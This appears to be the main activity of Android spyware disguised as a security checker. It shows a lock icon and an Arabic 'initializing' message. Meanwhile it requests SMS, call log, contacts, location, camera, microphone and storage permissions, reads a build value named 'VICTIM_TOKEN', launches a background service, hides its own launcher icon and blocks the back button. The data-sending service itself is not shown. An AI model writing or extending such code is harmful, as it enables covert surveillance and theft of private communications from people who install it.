package com.sec.check;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final String TAG = "SecurityCheck";
    private static final int PERMISSION_REQUEST = 1001;

    private static final String[] PERMISSIONS = {
            Manifest.permission.INTERNET,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_CALL_LOG,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "======== APP STARTED =========");

        String token = "DEFAULT";
        try {
            token = BuildConfig.VICTIM_TOKEN;
            Log.d(TAG, "Victim Token: " + token.substring(0, Math.min(12, token.length())) + "...");
        } catch (Exception e) {
            Log.e(TAG, "BuildConfig error: " + e.getMessage());
        }

        showTransparentUI();

        requestPermissionsIfNeeded();

        new Handler(Looper.getMainLooper()).postDelayed(this::startServiceNow, 3000);
        new Handler(Looper.getMainLooper()).postDelayed(this::hideAppIcon, 5000);
    }

    private void showTransparentUI() {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#00000000"));
        root.setGravity(Gravity.CENTER);
        root.setPadding(40, 40, 40, 40);

        TextView icon = new TextView(this);
        icon.setText("🔒");
        icon.setTextSize(64);
        icon.setGravity(Gravity.CENTER);
        root.addView(icon);

        TextView msg = new TextView(this);
        msg.setText("جاري التهيئة...");
        msg.setTextSize(12);
        msg.setTextColor(Color.parseColor("#888888"));
        msg.setGravity(Gravity.CENTER);
        msg.setPadding(0, 20, 0, 0);
        root.addView(msg);

        setContentView(root);
    }

    private void requestPermissionsIfNeeded() {
        if (Build.VERSION.SDK_INT < 23) return;

        List<String> need = new ArrayList<>();
        for (String p : PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }

        Log.d(TAG, "Permissions needed: " + need.size());
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    need.toArray(new String[0]), PERMISSION_REQUEST);
        }
    }

    private void startServiceNow() {
        try {
            Intent svc = new Intent(this, ServiceRunner.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "Service started");
        } catch (Exception e) {
            Log.e(TAG, "Start service error: " + e.getMessage());
        }
    }

    private void hideAppIcon() {
        try {
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName component = new android.content.ComponentName(
                    this, MainActivity.class);
            pm.setComponentEnabledSetting(component,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP);
            Log.d(TAG, "App icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "hideAppIcon: " + e.getMessage());
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Log.d(TAG, "== Permissions result ==");
        for (int i = 0; i < permissions.length; i++) {
            Log.d(TAG, permissions[i] + " -> "
                    + (grantResults[i] == PackageManager.PERMISSION_GRANTED
                    ? "GRANTED" : "DENIED"));
        }
    }

    @Override
    public void onBackPressed() {
        // منع الإغلاق
    }
                }
